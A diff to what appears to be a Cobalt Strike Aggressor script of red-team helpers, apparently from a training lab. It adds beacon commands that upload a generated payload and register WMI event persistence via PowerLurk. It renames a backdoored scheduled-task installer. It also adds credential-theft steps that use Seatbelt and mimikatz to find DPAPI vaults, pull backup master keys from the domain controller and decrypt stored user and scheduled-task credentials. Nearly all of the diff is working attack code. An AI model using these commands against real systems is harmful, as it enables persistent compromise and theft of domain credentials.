@@ -12,6 +12,7 @@ $ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release
 $SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
 $SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
 $GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
+$POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");
 
 #TEST FUNCTION
 command beacons {
@@ -75,7 +76,7 @@ beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to ru
 #ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
 sub invoke_dcom_remoteexec
 {
-    local('$handle $script $oneliner $filename $payload');
+    local('$handle $script $oneliner');
 
     #beacon acknowledgement
     btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");
@@ -279,10 +280,11 @@ beacon_command_register(
     "rbcd_findtargets",
     "Find Role Based Constrained Delegation Machines");
 
+
 #PERSISTANCE METHODS
 ## SCHEDULED TASKS
 #execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly
-alias sharpersist_schtask {
+alias persist_schtask {
     $rand = rand_alphanum(4);
     
     #not encoding properly!
@@ -299,10 +301,49 @@ alias sharpersist_schtask {
     bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
 }
 beacon_command_register(
-    "sharpersist_schtask",
-    "Install a backdoor in scheduled task",
-    "Usage: sharpersist_schtask [powershell commands]"
+    "persist_schtask",
+    "Install a backdoored scheduled task",
+    "Usage: persist_schtask [powershell commands]"
 );
+
+##WMI EVENTS
+alias persist_wmievent{
+    #$1 beaconid
+    #$2 name
+    #$3 processname
+    #$4 listener
+
+    #check if beacon is elevated
+    if(-isadmin $1){
+        #beacon acknowledgement
+        btask($1, "Task Beacon to register WMI Event");
+
+        #import the script
+        $handle = openf($POWERLURK_PATH);
+        $script = readb($handle, -1);
+        closef($handle);
+
+        #send script to beacon
+        $oneliner = beacon_host_script($1, $script);
+
+        #generate payload (stageless)
+        $payload = artifact_payload($4, "exe", "x64");
+        $filename = rand_alphanum(4) . ".exe";
+
+        #upload payload to target
+        $upload_path = "C:\\Windows\\Temp\\ $+ $filename $+ ";
+        bupload_raw($1, $upload_path , $payload);
+
+        bpowerpick($1, "Register-MaliciousWmiEvent -EventName $2 -PermanentCommand \" $+ $upload_path $+ \" -Trigger ProcessStart -ProcessName $3", $oneliner);
+    } else {
+        berror($1, "Can only be run from elevated access.");
+    }
+}
+beacon_command_register(
+    "persist_wmievent",
+    "Use PowerLurk to reate triggers for wmi events",
+    "Usage: persist_wmievent [Name] [ProcessName] [listener]"
+)
 
 #PRIVILEGE ESCALATION HELPERS
 ##UNQUOTED SERVICE PATHS
@@ -365,3 +406,96 @@ beacon_command_register(
     "Checkes for weak service binary permissions",
     "Uses SharpUp to check for weak service binary permissions"
 );
+
+#DPAPI HACKAGE
+##STORED USER CREDS
+###FIND VAULTS
+sub dpapi_findvaults_cb{
+    blog($1, $2);
+    blog($1, "Check for potential creds to target.");
+}
+alias dpapi_findvaults {
+    bexecute_assembly($1, $SEATBELT_PATH, "WindowsVault", $null, &dpapi_findvaults_cb);
+}
+beacon_command_register("dpapi_findvaults", "Locate DPAPI Vaults w/ Seatbelt");
+
+###FIND CREDENTIAL FILS
+sub dpapi_findcredfiles_cb{
+    blog($1, $2);
+    blog($1, "Note the master key guid\nUse 'powerpick get-domainuser bfarmer | select -expand objectsid' to get userSID");
+}
+alias dpapi_findcredfiles {
+    bexecute_assembly($1, $SEATBELT_PATH, "WindowsCredentialFiles", $null, &dpapi_findcredfiles_cb);
+}
+beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt");
+
+###REQUEST MASTERKEY FROM DC VIA RPC
+alias dpapi_reqBackupMasterKey {
+    #   C:\Users
+    #$2 \bfarmer (username)
+    #   \AppData\Roaming\Microsoft\Protect
+    #$3 \S-1-5-21-569305411-121244042-2357301523-1104 (User SID)
+    #$4 \bfc5090d-22fe-4058-8953-47f6882f549e (Master Key)
+    
+    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
+    println("CredPath: " . $credpath);
+    bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
+}
+beacon_command_register(
+    "dpapi_reqBackupMasterKey",
+    "Use mimikatz to request backup Masterkey from DC",
+    "Usage: dpapi_reqBackupMasterKey [userid] [userSID] [MasterKeyGUID]"
+);
+
+###DECRYPT CREDENTIAL FILE
+alias dpapi_decryptCredFile {
+    #$2 (username)
+    #$3 (Credential File UID)
+    #$4 (master key)
+
+    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Local\\Microsoft\\Credentials\\ $+ $3 $+ ";
+    bmimikatz($1, "dpapi::cred /in: $+ $credpath $+  /masterkey: $+ $4 $+ ");
+}
+beacon_command_register(
+    "dpapi_decryptCredFile",
+    "Decrypte Credential with DPAPI Master Key",
+    "Usage: dpapi_decryptCredFile [username] [Cred File UID] [MasterKey]"
+);
+
+##STORED SCHEDULED TASK CREDS
+###FIND CREDENTIAL FILES
+$files = @();
+$masterkey = '';
+sub dpapi_schtask_listCredFiles_mimicred_cb {
+    #$1 = beacon ID, $2 = results, $3 = information map
+    #guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
+    local('$regex');
+    $regex = 'guidMasterKey.*\{(.*)\}';
+    $masterkey = matches($2, $regex)[0];
+    println("dpapi_schtask_listCredFiles_mimicred_cb - Master Key: " . $masterkey);
+    println("dpapi_schtask_listCredFiles_mimicred_cb - File: " . $files);
+}
+sub dpapi_schtask_listCredFiles_lscb {
+    #$1 = beacon ID, $2 = the folder, $3 = results
+    local('$regex');
+    $regex = '(\p{XDigit}{32})';
+    $files = matches($3, $regex);
+    # blog($1, "Found Credential Files: " . $files);
+    foreach $file ($files){
+        bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
+        println("dpapi_schtask_listCredFiles_lscb - Master Key: " . $masterkey);
+        println("dpapi_schtask_listCredFiles_lscb - File: " . $files);
+    }
+}
+alias dpapi_schtask_listCredFiles {
+    $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
+    bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
+    println("dpapi_schtask_listCredFiles - Master Key: " . $masterkey);
+    println("dpapi_schtask_listCredFiles - File: " . $files);
+
+    
+}
+beacon_command_register(
+    "dpapi_schtask_listCredFiles",
+    "List Scheduled Task Credential Files"
+)
